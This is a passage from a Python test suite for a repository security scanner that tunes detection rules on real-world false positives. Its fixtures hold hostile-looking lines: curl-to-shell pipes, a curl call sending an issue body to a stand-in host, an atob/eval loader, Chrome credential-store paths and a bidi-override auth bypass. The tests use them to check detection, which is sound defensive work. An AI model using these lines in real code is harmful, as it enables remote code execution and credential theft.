        "    curl -f -L -o /tmp/tini https://github.test/tini/releases/download/v0.19.0/tini ; \\\n"
        '    echo "${tini_sum}  /tmp/tini" | sha256sum -c - ; \\\n'
        # `chmod +x` is what the rule's download-then-run form looks for, and it is
        # what the real Dockerfile does -- a downloaded binary has to be made
        # executable before it can run. Without it the fixture did not match the rule
        # at all, so the first version of this test asserted a demotion that never
        # happened.
        "    chmod +x /tmp/tini ; \\\n"
        "    /tmp/tini --version\n"
    )
    UNVERIFIED = "FROM debian:12\nRUN curl -sL https://deb.nodesource.test/setup_20.x | bash -\n"

    @staticmethod
    def fetch_exec(root):
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
        return [f for f in result.findings if f.rule_id == "SUSPECT.CONTAINER.FETCH_EXEC.001"]

    def test_an_unverified_pipe_into_a_shell_blocks(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        (tmp_path / "Dockerfile").write_text(self.UNVERIFIED, encoding="utf-8")
        hits = self.fetch_exec(tmp_path)
        assert hits and all(f.severity >= Severity.HIGH for f in hits)

    def test_a_verified_fetch_is_still_reported_and_does_not_block(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        (tmp_path / "Dockerfile").write_text(self.VERIFIED, encoding="utf-8")
        hits = self.fetch_exec(tmp_path)
        assert hits, "a verified fetch is still a fetch and stays in the report"
        assert all(f.severity <= Severity.MEDIUM for f in hits)
        assert any("verifies what it downloaded" in f.message for f in hits)

    def test_the_mitigation_must_be_near_the_match(self, tmp_path) -> None:
        """A Dockerfile with twenty `RUN` instructions may verify one download and
        pipe another straight into a shell. Crediting the careless one for the careful
        one's checksum would be worse than not looking, so the window is local."""
        from cordon_scanner.core.models import Severity

        padding = "".join(f"RUN echo step{i}\n" for i in range(60))
        (tmp_path / "Dockerfile").write_text(
            self.VERIFIED + padding + self.UNVERIFIED.split("\n", 1)[1], encoding="utf-8"
        )
        hits = self.fetch_exec(tmp_path)
        assert any(f.severity >= Severity.HIGH for f in hits), [
            (str(f.severity), f.location.line) for f in hits
        ]

    def test_demote_clamps_at_info(self) -> None:
        """`Severity(INFO - 1)` raises, and a report is not the place to find that
        out."""
        from cordon_scanner.core.models import Severity

        assert Severity.CRITICAL.demote() is Severity.HIGH
        assert Severity.INFO.demote() is Severity.INFO


class TestANameEndingInLocationHoldsALocation:
    """Three more from the measurement tail, each a name that says what it holds.

    Elasticsearch declares `WEB_IDENTITY_TOKEN_FILE_LOCATION` and
    `POD_IDENTITY_TOKEN_FILE_LOCATION`, both holding a filesystem path, and its
    `TESTING.asciidoc` was reported for a documented example password -- `.adoc` was on
    the documentation list and `.asciidoc` was not.

    Its build scripts `publish_zstd_binaries.sh` and `publish_simdjson_binaries.sh`
    were reported as exfiltration. The second sits under `libs/simdjson/native/`, which
    no directory glob reaches, but the filename says exactly what it does.
    """

    @pytest.mark.parametrize(
        "name",
        [
            "WEB_IDENTITY_TOKEN_FILE_LOCATION",
            "POD_IDENTITY_TOKEN_FILE_LOCATION",
            "TOKEN_CACHE_DIRECTORY",
            "SECRET_STORE_HOSTNAME",
        ],
    )
    def test_a_location_name_is_not_a_credential(self, name: str) -> None:
        assert names_configuration(name)

    @pytest.mark.parametrize("path", ["TESTING.asciidoc", "docs/guide.asciidoc", "NOTES.org"])
    def test_asciidoc_is_documentation(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_documentation

        assert is_documentation(path)

    @pytest.mark.parametrize(
        "path",
        [
            "dev-tools/publish_zstd_binaries.sh",
            "libs/simdjson/native/publish_simdjson_binaries.sh",
            "ci/release-macos.sh",
            "bin/deploy_staging.sh",
        ],
    )
    def test_a_publishing_script_is_build_tooling(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling

        assert is_build_tooling(path)

    @pytest.mark.parametrize("path", ["src/publisher.py", "lib/release_notes.rb"])
    def test_application_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling

        assert not is_build_tooling(path)


class TestAConcurrencyGroupIsNotAShellCommand:
    """`SUSPECT.CI.EXPRESSION_INJECTION.001` fired ten times on DuckDB's workflows, on

        concurrency:
          group: osx-${{ github.workflow }}-${{ github.ref }}-${{ github.head_ref }}

    which is the documented way to scope cancellation per branch. A group name is a
    string GitHub compares for equality: there is no shell, so there is nothing to
    inject into.

    The rule already exempted a line that is ONLY `KEY: ${{ ... }}`, because that is
    the remediation it recommends. This line has other text around the expression, so
    the exemption did not apply -- and the rule's own message says "interpolated
    directly into a script".

    `name`, `runs-on`, `container`, `image` and `environment` are the same shape:
    GitHub consumes the value rather than handing it to an interpreter. `key` and
    `restore-keys` reach a cache, and cache poisoning is its own rule.
    """

    @staticmethod
    def fires(workflow: str) -> bool:
        from cordon_scanner.detect.config_files import RULES, ConfigDetector

        rule = next(r for r in RULES if r.rule_id == "SUSPECT.CI.EXPRESSION_INJECTION.001")
        raw = workflow.encode()
        return rule.pattern.search(ConfigDetector._without_comments(raw)) is not None

    @pytest.mark.parametrize(
        "line",
        [
            "concurrency:\n  group: osx-${{ github.workflow }}-${{ github.head_ref }}\n",
            "    name: build-${{ github.head_ref }}\n",
            "    runs-on: ${{ github.head_ref }}-runner\n",
            "      key: cache-${{ github.head_ref }}\n",
        ],
    )
    def test_a_value_that_never_reaches_a_shell_is_quiet(self, line: str) -> None:
        assert not self.fires(line)

    @pytest.mark.parametrize(
        "line",
        [
            '      - run: echo "Thanks for ${{ github.event.pull_request.title }}"\n',
            "      - run: git checkout ${{ github.head_ref }}\n",
            '      - run: curl -d "${{ github.event.issue.body }}" https://x.test/i\n',
        ],
    )
    def test_interpolation_into_a_script_still_fires(self, line: str) -> None:
        assert self.fires(line)

    def test_binding_to_an_environment_variable_stays_exempt(self) -> None:
        """The remediation the rule recommends, which it used to report on - seventy-two
        times across Django's, Grafana's and Home Assistant's workflows."""
        assert not self.fires("    env:\n      TITLE: ${{ github.event.pull_request.title }}\n")


class TestAFormatNobodyListedIsStillBinary:
    """DuckDB's `data/secrets/http/*.duckdb_secret` produced three Stripe secret-key
    findings from chance byte sequences. It is a serialised struct starting
    `d\\x00\\x04http`, with no magic number in `BINARY_MAGIC` and an extension no table
    lists, so it was scanned as text.

    A third signal settles it: content that contains a NUL **and** will not decode as
    UTF-8. Both halves are required, and that is what keeps it from being the bypass
    the original heuristic was. `b"\\x00" in raw[:8192]` alone meant prepending
    `/* NUL */` to a payload removed the file from every detector at once; such a file
    still decodes as UTF-8, so it stays text. Bytes that are both NUL-bearing and
    undecodable are not a text file with something prepended.
    """

    @staticmethod
    def content(path: str, raw: bytes):
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw))

    def test_an_unlisted_binary_format_is_binary(self) -> None:
        raw = b"d\x00\x04httpe\x00\x06configf\x00\x0chttp_v_1_1_0g\x00\x00\xc9\x00d\x00d\x00"
        assert self.content("data/secrets/http/http_v_1_1_0.duckdb_secret", raw).is_binary

    def test_the_nul_bypass_stays_closed(self) -> None:
        """The evasion the original heuristic had, and the reason the NUL test alone
        was removed: a payload with a NUL in a comment must still be scanned."""
        raw = b"/* \x00 */\nconst p = atob(BLOB);\neval(p);\n"
        assert not self.content("loader.js", raw).is_binary

    def test_ordinary_source_is_not_binary(self) -> None:
        raw = b"def f(x):\n    return x + 1\n"
        assert not self.content("mod.py", raw).is_binary

    def test_utf8_text_with_no_nul_is_not_binary(self) -> None:
        """Undecodable alone is not enough either: a latin-1 file with no NUL is text
        somebody wrote in another encoding, not a binary format."""
        raw = "name = 'café'\n".encode("latin-1")
        assert not self.content("conf.ini", raw).is_binary

    def test_the_duckdb_fixture_produces_no_secret_findings(self, tmp_path) -> None:
        data = tmp_path / "data" / "secrets" / "http"
        data.mkdir(parents=True)
        (data / "http_v_1_1_0.duckdb_secret").write_bytes(
            b"d\x00\x04httpe\x00\x06configf\x00\x0chttp_v_1_1_0g\x00\x00\xc9\x00"
            + bytes(range(256)) * 2
        )
        assert not {r for r in flagged(tmp_path) if r.startswith("SECRET.")}


class TestAGoCompositeLiteralIsNotACredential:
    """Vault supplied sixteen findings of one shape, all Go composite literals assigned
    to a credential-shaped field:

        Password: &v5.ChangePassword{
        secret.Auth = &api.SecretAuth{
        TOTPSecret: &mfa.TOTPSecret{
        password = &proto.ChangePassword{

    Each ends its line, so the unquoted branch's end-of-line lookahead was satisfied,
    and `&`, `.` and `{` were all permitted value characters. `}` was excluded and `{`
    was not.

    A credential never contains a brace. Base64, hex, JWTs and every provider format
    are drawn from alphabets that have none, so a brace in a value means a struct
    literal, a block, or an interpolation -- and excluding the opening one removes the
    whole class in a single character.
    """

    VALUE = ("aB3kQ9mZ", "2xT7vL4nR8wY")

    def fires(self, line: str) -> bool:
        return ASSIGNMENT.search(line.encode()) is not None

    @pytest.mark.parametrize(
        "line",
        [
            "\t\t\tPassword: &v5.ChangePassword{",
            "\t\tsecret.Auth = &api.SecretAuth{",
            "\t\t\tTOTPSecret: &mfa.TOTPSecret{",
            "\t\tpassword = &proto.ChangePassword{",
            "  Secret: &logical.Secret{",
        ],
    )
    def test_a_struct_literal_is_not_a_value(self, line: str) -> None:
        assert not self.fires(line)

    @pytest.mark.parametrize("line", ['SECRET_KEY = "{0}"', "api_token={0}", "password: '{0}'"])
    def test_a_real_assignment_still_fires(self, line: str) -> None:
        assert self.fires(line.format(assemble(*self.VALUE)))

    def test_a_value_that_says_it_is_not_a_credential(self) -> None:
        """Vault's rollback test sets `bindpass="intentionally-wrong-password"`, which
        is a sentence announcing itself."""
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert PLACEHOLDER.search(b"intentionally-wrong-password")
        assert not PLACEHOLDER.search(assemble(*self.VALUE).encode())

    @pytest.mark.parametrize(
        "path",
        [
            "command/server/config_test_helpers.go",
            "internal/db/query_test_utils.go",
            "pkg/client/client_testing.go",
        ],
    )
    def test_a_plural_helper_file_is_test_material(self, path: str) -> None:
        """`**/*_test_helper.*` was listed and the plural was not, which is the
        spelling Vault uses."""
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path)


class TestOneVariableAssignedToAnother:
    """`next_token = continuation_token` in Airflow's Glue hook, reported as a
    credential. The value is an identifier: this is a pagination loop, and every one
    ever written has this line.

    `NOT_A_SECRET` has a separated-identifier alternative that should have covered it,
    guarded by a lookahead rejecting a long single-case run -- and "continuation" is
    exactly twelve lowercase letters, the threshold. So are "authorization",
    "configuration", "serialization", "implementation" and "transformation".

    Raising the threshold to twenty was tried and the existing suite refused it inside
    one run: `glpat-AAAAAAAAAAAAAAAA` is sixteen repeated characters, so a padded
    GitLab token became "a separated identifier".
    `test_a_separator_does_not_launder_key_material` exists for exactly that and was
    right, so the threshold stayed and the fix moved to `PLACEHOLDER`, where the
    mechanism for "the words themselves, used as their own name" already lived.
    """

    @staticmethod
    def dismissed(value: bytes) -> bool:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        return bool(NOT_A_SECRET.match(value)) or bool(PLACEHOLDER.search(value))

    @pytest.mark.parametrize(
        "value",
        [
            b"continuation_token",
            b"next_token",
            b"previous_token",
            b"page_token",
            b"refresh_token",
            b"service_account_token",
            b"current_password",
            b"raw_secret",
        ],
    )
    def test_a_variable_reference_is_not_a_value(self, value: bytes) -> None:
        assert self.dismissed(value)

    @pytest.mark.parametrize(
        "parts",
        [
            ("glpat-", "AAAAAAAAAAAAAAAA"),
            ("hunter2", "Sup3r", "SecretValue"),
            ("aB3kQ9mZ", "2xT7vL4nR8wY"),
        ],
    )
    def test_key_material_is_not_laundered(self, parts: tuple[str, ...]) -> None:
        """The guard the threshold experiment tripped. Kept here too, because this is
        where somebody reading the fix will be."""
        assert not self.dismissed(assemble(*parts).encode())

    def test_a_sentinel_wears_underscores_at_both_ends(self) -> None:
        """webpack declares `MODULE_REFERENCE_TOKEN = "__WEBPACK_MODULE_REFERENCE__"`.
        The identifier alternative required the first character to be a letter and
        allowed no trailing separator."""
        assert self.dismissed(b"__WEBPACK_MODULE_REFERENCE__")

    @pytest.mark.parametrize(
        "value", [b"sk-ecdsa-sha2-nistp256@openssh.com", b"sk-ssh-ed25519@openssh.com"]
    )
    def test_an_ssh_algorithm_name_is_not_a_credential(self, value: bytes) -> None:
        """Ansible declares these, and `sk-` is in `CREDENTIAL_PREFIXES`, so the
        assembled path read an algorithm name as a key. A name qualified by a domain is
        an identifier; a credential is not addressed at a host."""
        assert self.dismissed(value)


class TestABinDirectoryIsWhereAProgramKeepsItself:
    """`SUSPECT.BINARY.EXECUTABLE_PATH.001` reported Elasticsearch's
    `distribution/src/bin/elasticsearch-service-x64.exe` and
    `elasticsearch-service-mgr.exe` at HIGH, as sitting "where a lifecycle step will
    run it". They sit where a USER runs them: that is the Windows service Elasticsearch
    installs, and `bin/` is the documented place for a program's own executables rather
    than a surprising one.

    `scripts/`, `.githooks/` and `postinstall/` are lifecycle locations -- something
    else runs what is in them, unprompted. `bin/` is the opposite.

    Nothing stops being reported. The other branch emits
    `POLICY.BINARY.COMMITTED.001`, which is the accurate statement: a binary was
    committed, and a binary is unreviewable wherever it lives.
    """

    ELF = b"\x7fELF" + b"\x00" * 64

    @staticmethod
    def rules_in(root) -> set[str]:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        return {
            f.rule_id
            for f in Scanner(Config.default().with_overrides(use_cache=False)).scan(root).findings
        }

    def test_a_shipped_executable_is_a_policy_note(self, tmp_path) -> None:
        target = tmp_path / "distribution" / "src" / "bin"
        target.mkdir(parents=True)
        (target / "service-mgr.exe").write_bytes(self.ELF)
        found = self.rules_in(tmp_path)
        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" not in found, found
        assert "POLICY.BINARY.COMMITTED.001" in found, found

    def test_the_same_binary_under_scripts_still_blocks(self, tmp_path) -> None:
        """The guard. `scripts/` is a lifecycle location and the rule's whole point."""
        target = tmp_path / "scripts"
        target.mkdir()
        (target / "helper").write_bytes(self.ELF)
        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" in self.rules_in(tmp_path)

    def test_and_under_a_hooks_directory(self, tmp_path) -> None:
        target = tmp_path / ".githooks"
        target.mkdir()
        (target / "pre-commit").write_bytes(self.ELF)
        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" in self.rules_in(tmp_path)


class TestPersistenceIsWhatAnInstallerDoes:
    """`SUSPECT.PERSIST.001` produced five hundred findings across 104 of 1,396
    repositories, and installer directories were most of them. The Proxmox
    helper-script collection keeps `install/mysql-install.sh`,
    `install/zammad-install.sh` and a hundred siblings, each setting up a systemd
    unit.

    `**/install.sh` was on the build-tooling list and `install/` as a DIRECTORY was
    not.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "install/mysql-install.sh",
            "install/zammad-install.sh",
            "installer/postinstall.sh",
            "provisioning/node.sh",
        ],
    )
    def test_an_installer_directory_is_build_tooling(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling

        assert is_build_tooling(path)

    @pytest.mark.parametrize("path", ["src/installers.py", "app/provision_account.rb"])
    def test_application_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_build_tooling

        assert not is_build_tooling(path)


class TestABundlerThatHashesItsOutputDefeatsEveryGlob:
    """`SUSPECT.DECODE_CHAIN.001` and `SUSPECT.DECODE_EXEC.001` fired on
    `assets/ToolsPage-COpoWLDm.js` and `assets/index-BTLZFAP9.js`, which are Vite
    output. A minified bundle contains a decoder beside an evaluator because that is
    what a module loader is, so it supplies both composites by construction.

    `*.min.js`, `dist/` and `.yarn/releases/` are on the path list and a content hash
    matches no convention a glob can express, so the signal has to be the content: a
    line over a thousand characters is not something anybody writes by hand.

    Worth recording what this does NOT touch. The same rule's largest real
    contributors in that run were `tennc/webshell` - a collection of PHP webshells,
    which is malware by design and correctly reported - and Metasploit's exploit
    modules. Neither is minified, and both still report.
    """

    @staticmethod
    def content(path: str, text: str):
        from cordon_scanner.core.content import FileContent

        raw = text.encode()
        return FileContent(path=path, raw=raw, size=len(raw))

    def test_a_hashed_bundle_is_recognised(self) -> None:
        from cordon_scanner.detect.capability import CapabilityDetector

        bundle = "var a=1;" * 400
        assert CapabilityDetector._is_minified(self.content("assets/index-BTLZFAP9.js", bundle))

    def test_ordinary_source_is_not(self) -> None:
        from cordon_scanner.detect.capability import CapabilityDetector

        source = "function add(a, b) {\n    return a + b;\n}\n" * 50
        assert not CapabilityDetector._is_minified(self.content("src/math.js", source))

    def test_a_minified_bundle_is_reported_below_blocking(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        assets = tmp_path / "assets"
        assets.mkdir()
        (assets / "index-BTLZFAP9.js").write_text(
            "var _x=1;" * 200 + "var p=atob(B),q=new Function(p);q();" + "var _y=2;" * 200 + "\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        decode = [f for f in result.findings if f.rule_id.startswith("SUSPECT.DECODE")]
        assert all(f.severity <= Severity.MEDIUM for f in decode), [
            (f.rule_id, str(f.severity)) for f in decode
        ]

    def test_hand_written_source_doing_the_same_thing_still_blocks(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        source = tmp_path / "src"
        source.mkdir()
        (source / "loader.js").write_text(
            "const payload = atob(BLOB);\nconst run = new Function(payload);\nrun();\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        decode = [f for f in result.findings if f.rule_id.startswith("SUSPECT.DECODE")]
        assert decode and any(f.severity >= Severity.HIGH for f in decode)


class TestACookieJarIsNotAChromeProfile:
    """`SUSPECT.EXFIL.CREDENTIAL_STORE.001` fired in 75 of 1,396 repositories, on
    rclone's WebDAV cookie fetcher, a Rust TLS module, next.js's router and a Homebrew
    formula. The capability pattern matched the bare word `Cookies`.

    Chrome's cookie store is a file inside a profile directory -- `.../Default/Cookies`
    -- and without a path separator or a quote in front, the word matches
    `resp.Cookies()`, `http.Cookies` and a struct field of that name in every HTTP
    client ever written. rclone uses it four times in one file, which was enough to
    pair with an egress call and report a credential-theft finding at HIGH on a file
    whose job is fetching a cookie for the user.

    The rule already carried `cookies = session.cookies.get_dict()` as a negative test.
    That passes on the lowercase spelling alone, so it never exercised the capitalised
    one Go, C# and Java use.

    Requiring only a path separator broke the corpus sample, which builds the path the
    way Python actually does: `Path.home() / ".config" / "google-chrome" / "Default" /
    "Login Data"`, where every component is a quoted string and none carries a slash.
    A separator OR an opening quote covers both, and a bare identifier is neither.
    """

    @staticmethod
    def store_pattern():
        from cordon_scanner.rules.loader import RuleLoader

        for pack in RuleLoader.load_builtin():
            for rule in pack.rules:
                if rule.id == "CAP.CREDENTIAL.STORE.001":
                    return rule.match.regex
        raise AssertionError("CAP.CREDENTIAL.STORE.001 is not in the built-in packs")

    @pytest.mark.parametrize(
        "line",
        [
            b"for _, c := range resp.Cookies() {",
            b"jar.Cookies = append(jar.Cookies, c)",
            b"var Cookies []*http.Cookie",
            b"response.Headers.Cookies",
            b"    Cookies: cookieJar,",
        ],
    )
    def test_an_http_cookie_jar_is_not_a_credential_store(self, line: bytes) -> None:
        assert self.store_pattern().search(line) is None

    @pytest.mark.parametrize(
        "line",
        [
            b"path = os.path.expanduser('~/.config/google-chrome/Default/Cookies')",
            b'profile = Path.home() / ".config" / "google-chrome" / "Default" / "Login Data"',
            b'shutil.copy(home / "Default" / "Web Data", staging)',
        ],
    )
    def test_a_browser_profile_store_still_matches(self, line: bytes) -> None:
        assert self.store_pattern().search(line) is not None


class TestAFileThatNamesTheAttackIsDocumentingIt:
    """Two bidi findings survived every path-based ceiling because both files are
    ordinary application code by every signal available.

    Bandit's `plugins/trojansource.py` is the plugin that DETECTS Trojan Source, and
    its docstring shows the sample output -- so the override characters sit in prose
    beside the words "trojansource", "bidirectional control character" and "CWE-838".

    webpack's `WebManifestParser.js` strips a byte-order mark before parsing JSON and
    writes the check as `if (source[0] === "\\ufeff")`, with the character itself. A BOM
    is invisible but not DIRECTIONAL: it cannot reorder anything, which is what this
    rule's message is about.

    An attacker does not label the override. That is the entire point of one -- it
    works because a reviewer cannot see it, and a comment announcing its presence
    defeats the technique. So a label is weak evidence for an attack and strong
    evidence for documentation.

    Both LOWER the severity rather than suppressing: the characters really are present,
    and a label is not proof of innocence.
    """

    OVERRIDE = chr(0x202E)

    def test_a_labelled_override_is_reported_below_blocking(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        (tmp_path / "trojansource.py").write_text(
            '"""Detects Trojan Source attacks.\n\n'
            "    Bidirectional control characters reorder how source renders.\n"
            f"    Example: if access_level != 'user' {self.OVERRIDE}\n"
            '    CWE-838\n"""\n\n'
            "def check(node):\n    return None\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
        assert bidi, "the characters are present and the finding stays in the report"
        assert all(f.severity <= Severity.LOW for f in bidi)

    def test_a_bom_in_a_one_character_literal_is_a_parser(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        (tmp_path / "parse.js").write_text(
            "function strip(source) {\n"
            f'\tif (source[0] === "{chr(0xFEFF)}") {{\n'
            "\t\tsource = source.slice(1);\n\t}\n\treturn source;\n}\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
        assert all(f.severity <= Severity.LOW for f in bidi)

    def test_an_unlabelled_override_in_code_still_blocks(self, tmp_path) -> None:
        """The guard, and the reason neither of these is a suppression: an override that
        does not announce itself is the attack."""
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        source = tmp_path / "src"
        source.mkdir()
        (source / "auth.py").write_text(
            f"access_level = 'user'\nif access_level != 'none {self.OVERRIDE} ':\n    grant()\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
        assert bidi and any(f.severity >= Severity.HIGH for f in bidi)


class TestAGitLfsPointerIsNotAForgery:
    """`unionlabs/union` produced 907 format-mismatch findings from a shallow clone.
    It tracks `*.png`, `*.pdf` and `*.psd` through Git LFS, so every tracked asset is
    about 130 bytes of text:

        version https://git-lfs.github.com/spec/v1
        oid sha256:c7c7bf33de10f0b172e1153222ca8ad8e3ba09681525662a2e00177560f4acb6
        size 755472

    A `.png` holding that is not a file lying about its type. It is a checkout without
    LFS content -- which is the DEFAULT for `actions/checkout`, so it is the state most
    CI runs are in, and any repository using LFS has the same shape.

    Reported rather than passed over, because a file that was not examined must not look
    like a file that was examined and found clean. Aggregated into one INFO finding the
    way binary skips already are, because 528 individual notices is its own kind of
    noise. Not treated as incompleteness: a repository's images being absent is not a
    degraded scan of its source, and marking it so would make `fail_on_incomplete`
    unusable for every project that uses LFS.
    """

    POINTER = (
        b"version https://git-lfs.github.com/spec/v1\n"
        b"oid sha256:c7c7bf33de10f0b172e1153222ca8ad8e3ba09681525662a2e00177560f4acb6\n"
        b"size 755472\n"
    )

    @staticmethod
    def content(path: str, raw: bytes):
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw))

    def test_a_pointer_is_recognised(self) -> None:
        assert self.content("static/app-og-image.png", self.POINTER).is_lfs_pointer

    def test_an_ordinary_file_is_not(self) -> None:
        assert not self.content(
            "static/logo.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
        ).is_lfs_pointer

    def test_text_mentioning_lfs_later_is_not(self) -> None:
        """Matched at offset zero, which is what the format requires and what `git lfs`
        itself looks for. A document about LFS is not a pointer."""
        raw = b"# Notes\n\nSee version https://git-lfs.github.com/spec/v1 for the format.\n"
        assert not self.content("docs/lfs.md", raw).is_lfs_pointer

    def test_no_mismatch_is_reported(self, tmp_path) -> None:
        static = tmp_path / "static"
        static.mkdir()
        for name in ("a.png", "b.pdf", "c.psd"):
            (static / name).write_bytes(self.POINTER)
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in flagged(tmp_path)

    def test_the_skip_is_reported_once(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        static = tmp_path / "static"
        static.mkdir()
        for index in range(12):
            (static / f"asset{index}.png").write_bytes(self.POINTER)
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        notices = [f for f in result.findings if f.rule_id == "OPERATIONAL.FILE.LFS_POINTER"]
        assert len(notices) == 1, [f.location.path for f in notices]
        assert "12 file(s)" in notices[0].message
        assert notices[0].severity is Severity.INFO

    def test_a_real_polyglot_is_still_reported(self, tmp_path) -> None:
        """The guard. A `.png` holding a script is what the rule exists for, and
        recognising pointers must not be a way to get past it: a pointer has a fixed
        first line, and a payload cannot have one and still be a payload."""
        static = tmp_path / "static"
        static.mkdir()
        (static / "logo.png").write_bytes(b"#!/bin/sh\ncurl https://x.test/p | sh\n")
        assert "SUSPECT.POLYGLOT.MISMATCH.001" in flagged(tmp_path)


class TestTwoImageFormatsConfusedIsNotADisguise:
    """`geekxh/hello-algorithm` produced 458 blocking findings and every one of them was
    a PNG saved under a `.jpg` name -- screenshots exported by a tool that writes PNG
    bytes whatever the filename says. Across the 1,487-repository corpus, image
    extensions accounted for 1,866 of the 1,980 format-mismatch findings.

    None of them is the thing the rule exists for. A polyglot is a file arranged so that
    the thing INSPECTING it and the thing RUNNING it disagree, and the disagreement is
    only a finding when the content can do something the name does not admit to: an
    executable, an archive, a script. A PNG named `.jpg` renders as an image either way,
    executes nothing either way, and conceals nothing from anybody.

    So the comparison is between KINDS, not names. Within a kind it is a naming error and
    silent; across kinds it is reported, and the message now says which way round.
    """

    PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
    JPEG = b"\xff\xd8\xff" + b"\x00" * 64
    GIF = b"GIF8" + b"\x00" * 64

    @pytest.mark.parametrize(
        ("path", "raw"),
        [
            ("docs/1.jpg", PNG),
            ("docs/1.jpeg", PNG),
            ("docs/shot.png", JPEG),
            ("docs/shot.png", GIF),
            ("docs/anim.gif", PNG),
        ],
    )
    def test_an_image_under_another_image_name_is_silent(self, path: str, raw: bytes) -> None:
        assert BinaryDetector.mismatch(path, BinaryDetector.identify(raw)) is None

    def test_a_gzip_named_zip_is_silent(self) -> None:
        """Same reasoning one kind over: `.tar.gz` renamed to `.zip` is somebody's
        download script, not a forgery."""
        assert (
            BinaryDetector.mismatch("dist/x.zip", BinaryDetector.identify(b"\x1f\x8b\x08\x00"))
            is None
        )

    @pytest.mark.parametrize(
        ("path", "raw"),
        [
            ("static/logo.png", ELF),
            ("static/logo.png", b"#!/bin/sh\necho x\n"),
            ("static/logo.png", b"PK\x03\x04rest"),
            ("static/photo.jpg", b"MZ\x90\x00" + b"\x00" * 40),
            ("docs/manual.pdf", PNG),
        ],
    )
    def test_a_different_kind_is_still_reported(self, path: str, raw: bytes) -> None:
        """The guard, in both directions. An image extension over an executable, an
        archive or a script is the finding; so is a document extension over an image,
        because the name still promises something the bytes are not."""
        assert BinaryDetector.mismatch(path, BinaryDetector.identify(raw)) is not None

    def test_the_message_names_both_kinds(self) -> None:
        message = BinaryDetector.mismatch("static/logo.png", BinaryDetector.identify(ELF))
        assert message is not None
        assert "an executable rather than an image" in message

    @pytest.mark.parametrize(
        ("path", "raw"),
        [
            ("lib/x.so", b"#!/bin/sh\necho x\n"),
            ("lib/x.dylib", JAVA_CLASS),
        ],
    )
    def test_executables_are_not_interchangeable(self, path: str, raw: bytes) -> None:
        """The narrowness of the exemption, stated as a test. Both of these are one kind
        -- executable -- and both stay reported: a script wearing a native library's name
        is the substitution the rule was written for, and comparing kinds alone would have
        silenced it. Only `INTERCHANGEABLE_KINDS` is exempt, and it holds two entries."""
        assert BinaryDetector.mismatch(path, BinaryDetector.identify(raw)) is not None

    def test_the_repository_shape_produces_nothing(self, tmp_path) -> None:
        """End to end, as the repository was laid out: a directory of numbered
        screenshots, all PNG bytes, all named `.jpg`."""
        shots = tmp_path / "sourcefile" / "701"
        shots.mkdir(parents=True)
        for index in range(1, 9):
            (shots / f"{index}.jpg").write_bytes(self.PNG)
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in flagged(tmp_path)


class TestAnotherAnalysersRuleCorpusIsNotAFinding:
    """`semgrep/semgrep-rules` produced 189 blocking findings and 188 of them were
    samples the repository publishes in order to be detected:

        // ruleid: adafruit-api-key
        adafruit_api_token = "9zu9r6idf9c0tfcc4w26l66ij7visb8n"

    That file is two lines long and the first says what the second is for. The same
    repository supplies a Terraform file with an IAM wildcard, a Kubernetes document
    whose `privileged: true` is a *pattern* rather than a deployment, and a bash file
    whose entire content is the capability pair the rule beside it matches. Five
    detectors fired on them.

    The class is not semgrep's. Any repository that vendors a rule set has the shape,
    which is most security teams' own repositories and this project's own rule packs --
    and this detector already had the case on record from Bandit, whose
    `plugins/trojansource.py` finds Trojan Source attacks and whose
    `examples/trojansource.py` is the example it was written against.

    A ceiling at INFO rather than a deletion. One comment line is cheap to add, so a
    predicate that removed findings would be a one-line bypass; the rule still runs and
    the evidence survives, below the default reporting threshold.
    """

    ANNOTATED = (
